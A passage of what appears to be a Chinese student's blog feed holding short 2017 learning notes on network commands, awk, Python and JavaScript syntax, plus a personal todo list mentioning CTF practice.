</code></pre><h4 id="router"><a href="#router" class="headerlink" title="router"></a>router</h4><pre><code>show arp        显示arp表
no arp          删除
</code></pre><h3 id="路由表"><a href="#路由表" class="headerlink" title="路由表"></a>路由表</h3><h4 id="pc-1"><a href="#pc-1" class="headerlink" title="pc"></a>pc</h4><pre><code>netstat -r
</code></pre><h4 id="router-1"><a href="#router-1" class="headerlink" title="router"></a>router</h4><pre><code>show ip route
no ip route
</code></pre><h2 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h2><h3 id="CAM表"><a href="#CAM表" class="headerlink" title="CAM表"></a>CAM表</h3><p>这个应该就是传说中的<code>MAC</code>和交换机接口对应的表</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>netstat命令 <a href="https://linux.cn/article-2434-1.html" target="_blank" rel="external">https://linux.cn/article-2434-1.html</a><br>多层交换概述 <a href="https://wenku.baidu.com/view/5e4111976bec0975f465e203.html" target="_blank" rel="external">https://wenku.baidu.com/view/5e4111976bec0975f465e203.html</a><br>多层交换机与路由器 <a href="http://network.pconline.com.cn/474/4741916.html" target="_blank" rel="external">http://network.pconline.com.cn/474/4741916.html</a><br>MAC表含义 <a href="http://skyeagle.blog.51cto.com/417071/93338" target="_blank" rel="external">http://skyeagle.blog.51cto.com/417071/93338</a></p>
]]></content>
      
        <categories>
            
            <category> 学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> network </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[sed]]></title>
      <url>/2017/05/30/sed/</url>
      <content type="html"><![CDATA[<p>日后填坑</p>
]]></content>
      
        
        <tags>
            
            <tag> sed </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[awk]]></title>
      <url>/2017/05/30/awk/</url>
      <content type="html"><![CDATA[<p>只能每天记一点辣</p>
<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>刚开始就只记录一些简单的用法好了<br>基本使用姿势</p>
<pre><code>awk &#39;BEGIN{ commands } pattern{ commands } END{ commands }&#39;
</code></pre><p>看有三部分 <code>BEGIN</code>, <code>pattern</code>, <code>END</code>, 每部分都可有可无</p>
<p>最简单的只有<code>pattern</code></p>
<pre><code>haibin:~$ last -n 5

haibin   tty7         :0               Tue May 30 14:18    gone - no logout
reboot   system boot  4.4.0-59-generic Tue May 30 14:16   still running
haibin   tty7         :0               Mon May 29 10:02 - down   (12:32)
reboot   system boot  4.4.0-59-generic Mon May 29 10:00 - 22:34  (12:34)
haibin   tty7         :0               Sun May 28 13:33 - crash  (20:26)
</code></pre><p>使用awk</p>
<pre><code>haibin:~$ last -n 5 | awk &#39;{print $1}&#39;

haibin
reboot
haibin
reboot
haibin
</code></pre><p>看出来了吧,,, $1是第一个域,$2…,$0是所有的,所以</p>
<pre><code>haibin:~$ last -n 5 | awk &#39;{print $0}&#39;
haibin:~$ last -n 5 | awk &#39;{print }&#39;
haibin:~$ last -n 5
</code></pre><p>是一样的</p>
<p><code>-F</code> 可以指定分隔符(默认是空格)<br>比如在<code>cat /etc/passwd</code>的时候就要用<code>-F :</code></p>
<h2 id="每部分"><a href="#每部分" class="headerlink" title="每部分"></a>每部分</h2><p><code>BEGIN</code> 可以做表头<br><code>END</code> 可以做最后信息的输出<br><code>pattern</code> 可以是正则,只匹配对应的行</p>
<p>patern (r开头的)</p>
<pre><code>cat /etc/passwd | awk -F : &#39;/^r/{print &quot;user: &quot; $1 &quot;\t shell: &quot; $7}&#39;


user: root     shell: /bin/bash
user: rtkit     shell: /bin/false
user: redis     shell: /bin/false
</code></pre><p>加个BEGIN</p>
<pre><code>cat /etc/passwd | awk -F : &#39;BEGIN{print &quot;user\tshell&quot;} /^r/{print  $1 &quot;\t&quot; $7}&#39;


user    shell
root    /bin/bash
rtkit    /bin/false
redis    /bin/false
</code></pre><p>加个END (统计个数)</p>
<pre><code>cat /etc/passwd | awk -F : &#39;BEGIN{i=0;print &quot;user\tshell&quot;} /^r/{i++;print  $1 &quot;\t&quot; $7} END{print &quot;total\t&quot;, i, &quot;users&quot;}&#39;

user    shell
root    /bin/bash
rtkit    /bin/false
redis    /bin/false
total     3 users
</code></pre><p>不过我这边用正则怎么有点问题</p>
<h2 id="从入门到入门"><a href="#从入门到入门" class="headerlink" title="从入门到入门"></a>从入门到入门</h2><p>今天没有时间入门了,来日方长</p>
]]></content>
      
        
        <tags>
            
            <tag> awk </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[redis]]></title>
      <url>/2017/05/30/redis/</url>
      <content type="html"><![CDATA[<p>想学一下redis<br>然后还想学一下前端构建工具<br>还有socket.io…</p>
<p>redis在ssrf里有很重要的作用<br>除此之外,其实确实想学好久了,等我有时间</p>
<p>先mark一下这个<br><a href="http://blog.just4fun.site/learn-redis.html" target="_blank" rel="external">http://blog.just4fun.site/learn-redis.html</a></p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
            <tag> redis </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[bash]]></title>
      <url>/2017/05/30/bash/</url>
      <content type="html"><![CDATA[<p>一直以来,不会用bash<br>我觉得语法好他喵的奇怪的,<br>昨天和zjm聊了下,,,原来我不是一个人<br>我是没办法去学这个…宁可用不太熟悉的py</p>
<p>然后搜到了这个<br><a href="http://blog.just4fun.site/shell-and-shellpy.html" target="_blank" rel="external">http://blog.just4fun.site/shell-and-shellpy.html</a><br>还有同一个作者的<br><a href="http://blog.just4fun.site/Python-for-system-administrators.html" target="_blank" rel="external">http://blog.just4fun.site/Python-for-system-administrators.html</a></p>
<p>ps 确实看到好多人推荐fish</p>
<p>喔,然后学一下awk, sed</p>
<p>恩,暂时我还是用这个好了<br><a href="http://amoffat.github.io/sh/" target="_blank" rel="external">http://amoffat.github.io/sh/</a></p>
]]></content>
      
        
        <tags>
            
            <tag> shell </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[trick | python-getattr]]></title>
      <url>/2017/05/30/python-getattr/</url>
      <content type="html"><![CDATA[<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> os
getattr<span class="token punctuation">(</span>os<span class="token punctuation">,</span> <span class="token string">"getcwd"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>相当于</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> os
os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>好菜啊…我<br>这样子就可以不通过<code>.</code>来调用对象方法了</p>
]]></content>
      
        <categories>
            
            <category> trick </category>
            
        </categories>
        
        
        <tags>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python-列表推导 js-数组推导]]></title>
      <url>/2017/05/30/python-%E5%88%97%E8%A1%A8%E6%8E%A8%E5%AF%BC-js-%E6%95%B0%E7%BB%84%E6%8E%A8%E5%AF%BC/</url>
      <content type="html"><![CDATA[<p>我的py学的菜爆了,哦,不是说我的js不菜,是都菜,我承认了,我现在都没认全py的类型</p>
<h2 id="python-列表推导"><a href="#python-列表推导" class="headerlink" title="python-列表推导"></a>python-列表推导</h2><p>不得不说py的REPL环境比node体验差很多啊,,,高亮没有,不全也没有,,,啊啊啊,<br>然后查了一下,据说,有一个<code>python-prompt-toolkit</code>的东西可以自己拿来构建一个REPL<br>链接 <a href="http://blog.just4fun.site/python-prompt-toolkit.html" target="_blank" rel="external">http://blog.just4fun.site/python-prompt-toolkit.html</a><br>我决定使用基于它它构建好的工具<br>阔怕,这个人的blog也推荐,不知道是不是他的blog,内容好多,真666</p>
<p>好了,前面说了一堆没用的,,,</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> res <span class="token operator">=</span> <span class="token punctuation">[</span>i <span class="token operator">*</span> i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
<span class="token comment" spellcheck="true">#=> [1, 4, 9]</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>如果有条件</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> res <span class="token operator">=</span> <span class="token punctuation">[</span>i <span class="token operator">*</span> i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token keyword">if</span> i <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">]</span>
<span class="token comment" spellcheck="true">#=> [4, 9]</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h2 id="js-数组推导"><a href="#js-数组推导" class="headerlink" title="js-数组推导"></a>js-数组推导</h2><p>这个功能本来是准备ES6加入的,后来推到了ES7</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> raw <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> res <span class="token punctuation">[</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token keyword">of</span> raw<span class="token punctuation">)</span> i <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>但,我发现我的node怎么跑不了这个代码</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">></span> <span class="token keyword">var</span> raw <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
undefined
<span class="token operator">></span> <span class="token keyword">var</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token keyword">of</span> raw<span class="token punctuation">)</span> i <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token operator">...</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>你给我三个点点点什么意思….难道是现在还没办法用吗,翻车了<br>无奈的我到FF里跑了一下确实可以的</p>
<p>这个功能甚至可以替代ES5里的map和filter (ﾉ*･ω･)ﾉ</p>
<h4 id="数组推导"><a href="#数组推导" class="headerlink" title="数组推导"></a>数组推导</h4><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token punctuation">[</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token keyword">of</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> i <span class="token operator">*</span> i<span class="token punctuation">]</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="ES5-map"><a href="#ES5-map" class="headerlink" title="ES5 map"></a>ES5 map</h4><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>i <span class="token operator">=</span><span class="token operator">></span> i <span class="token operator">*</span> i<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="Ramda"><a href="#Ramda" class="headerlink" title="Ramda"></a>Ramda</h4><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> R <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'ramda'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
R<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>i <span class="token operator">=</span><span class="token operator">></span> i <span class="token operator">*</span> i<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>或者让我科里化一次(傲娇状)</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> R <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'ramda'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
square <span class="token operator">=</span> R<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>i <span class="token operator">=</span><span class="token operator">></span> i <span class="token operator">*</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">square</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h3><p>实现filter的话,还需要使用if</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token punctuation">[</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token keyword">of</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">)</span> i<span class="token punctuation">]</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>好了,the end</p>
<blockquote>
<p>突然沮丧,又有什么用呢,你又不写前端,每天学这些,还想不想保研了</p>
</blockquote>
]]></content>
      
        
        <tags>
            
            <tag> python js </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ES5-数组方法]]></title>
      <url>/2017/05/30/ES5-%E6%95%B0%E7%BB%84%E6%96%B9%E6%B3%95/</url>
      <content type="html"><![CDATA[<h2 id="forEach"><a href="#forEach" class="headerlink" title="forEach"></a>forEach</h2><pre class="line-numbers language-javasript"><code class="language-javasript">[].forEach(function(value, index, array) {
    // ...
});
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="map"><a href="#map" class="headerlink" title="map"></a>map</h2><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> index<span class="token punctuation">,</span> array<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// ...</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>一个栗子</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> squre <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> index<span class="token punctuation">,</span> array<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> value <span class="token operator">*</span> value<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">// 好像是[, index, array]不需要的话可以不写</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>map相当于是一个增强版的forEach<br>map 可以对数组中每个元素调用函数,并且把函数的返回值收集起来,返回一个结果数组,没有返回值的就是undefined,而forEach只是执行callback,没有后面的功能</p>
<h2 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h2><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> newData <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> item <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">// => newData [0, 1]</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><code>return true</code>的加到结果当中,<code>false</code>的话就被<code>filter</code>掉了</p>
<p>棒的是可以链式调用</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span>
    <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> item <span class="token operator">*</span> item<span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> item <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">// => [ 0, 1, 4, 9 ]</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>如果是字符串的可以<code>return /reg/.test(item)</code>来filter咯</p>
<h2 id="some"><a href="#some" class="headerlink" title="some"></a>some</h2><p><code>some</code>的结果不会返回数组,会返回一个<code>true</code>or<code>false</code>,所以常丢到一个条件判断里</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">some</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> item <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">/*
 * 0
 * 1
 * 2
 * 3
*/</span>
<span class="token comment" spellcheck="true">//=> res true</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>只要有函数返回<code>true</code>,那最后结果就是<code>true</code><br><code>some</code>而且只要跑到<code>true</code>的时候,就不会进行下去了,forEach这种的话都会跑完<br>所以这里结果只console.log出来 0 1 2 3, 没有4 5</p>
<h2 id="every"><a href="#every" class="headerlink" title="every"></a>every</h2><p>就是都满足啦<br>所以跑到第一个不满足的地方,下一个值就不会跑了</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">every</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> item <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">// => 0</span>
<span class="token comment" spellcheck="true">// res false</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="reduce"><a href="#reduce" class="headerlink" title="reduce"></a>reduce</h2><p>要去吃饭打球了,抄别人一个栗子吧</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>pre<span class="token punctuation">,</span>cur<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> pre <span class="token operator">+</span> cur<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">//=> 10</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>就是一种累积效应</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>previous<span class="token punctuation">,</span> current<span class="token punctuation">,</span> index<span class="token punctuation">,</span> array<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// ...</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>另外可以设置一个初始值</p>
<pre class="line-numbers language-javascript"><code class="language-javascript">array<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span>callback<span class="token punctuation">[</span><span class="token punctuation">,</span> initialValue<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="reduceRight"><a href="#reduceRight" class="headerlink" title="reduceRight"></a>reduceRight</h2><p>就是从右边开始reduce</p>
]]></content>
      
        
        <tags>
            
            <tag> js </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ES6-解构赋值]]></title>
      <url>/2017/05/30/ES6-%E8%A7%A3%E6%9E%84%E8%B5%8B%E5%80%BC/</url>
      <content type="html"><![CDATA[<p>前几天和ZJM聊天,说到了这个解构赋值<br>又想到以前经常看到的</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">{</span>xxx<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'xxx'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>但没有注意啊,hhhh~还是好菜啊<br>今天准备写作业,然后偷偷上会儿网的时候看到了,记一下吧</p>
<h2 id="数组解构赋值"><a href="#数组解构赋值" class="headerlink" title="数组解构赋值"></a>数组解构赋值</h2><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> <span class="token punctuation">[</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">let</span> <span class="token punctuation">[</span>x<span class="token punctuation">,</span> <span class="token punctuation">,</span> z<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span>
<span class="token keyword">let</span> <span class="token punctuation">[</span>head<span class="token punctuation">,</span> <span class="token operator">...</span>tail<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">//这个酷炫吧,</span>
<span class="token comment" spellcheck="true">// => head=1; tail=[2,3,4], 这个即使是tail只有一个元素也是数组,所以</span>
<span class="token keyword">let</span> <span class="token punctuation">[</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token comment" spellcheck="true">// => a=1; b undefined; c []</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="对象解构赋值"><a href="#对象解构赋值" class="headerlink" title="对象解构赋值"></a>对象解构赋值</h2><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> <span class="token punctuation">{</span>foo<span class="token punctuation">,</span> bar<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token punctuation">{</span>bar<span class="token punctuation">:</span> <span class="token string">'bar'</span><span class="token punctuation">,</span> foo<span class="token punctuation">:</span> <span class="token string">'foo'</span><span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>如果变量名和属性名不一样</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> <span class="token punctuation">{</span>foo<span class="token punctuation">:</span> baz<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token punctuation">{</span>foo<span class="token punctuation">:</span> <span class="token string">'aaa'</span><span class="token punctuation">,</span> bar<span class="token punctuation">:</span> <span class="token string">'bbb'</span><span class="token punctuation">}</span>
<span class="token comment" spellcheck="true">//=> baz 'aaa'</span>
<span class="token comment" spellcheck="true">//=> foo not defined</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>还有一个点,变量的<code>let</code>,<code>const</code>, 不能重复申明</p>
<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">let</span> old<span class="token punctuation">;</span>
<span class="token keyword">let</span> <span class="token punctuation">{</span>old<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token punctuation">{</span>old<span class="token punctuation">:</span> <span class="token string">'young'</span><span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h2 id="没有了"><a href="#没有了" class="headerlink" title="没有了"></a>没有了</h2><p>就是回想起来那天的<code>Ramda</code><br>其实我ES5里那些像是函数式的方法,,比如map啊之类的,掌握还欠缺<br>大部分时候其实用那个就可以了</p>
]]></content>
      
        
        <tags>
            
            <tag> js </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[todo]]></title>
      <url>/2017/05/29/todo-3/</url>
      <content type="html"><![CDATA[<h2 id="todo"><a href="#todo" class="headerlink" title="todo"></a>todo</h2><p>看保研相关的东西,好烦人啊,我并不想看==我想学东西 […]<br>吃粽子 [√]<br>看哆啦A梦 [×]<br>写单片机作业 [×]<br>写网络安全作业 [×]<br>复习</p>
<ul>
<li>嵌入式</li>
<li>网络安全</li>
<li>单片机</li>
<li>数据挖掘<br>准备考六级<br>复习文化课<br>补ssctf,rctf,syc题目<br>打一场计算客?<br>计划总是那么丰满<br>bugku和南邮的CTF补题</li>
</ul>
<h2 id="书单"><a href="#书单" class="headerlink" title="书单"></a>书单</h2><h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><p>代码审计 看过,重读<br>Web应用安全权威指南 看过,重读<br>黑客攻防技术宝典-浏览器实战篇</p>
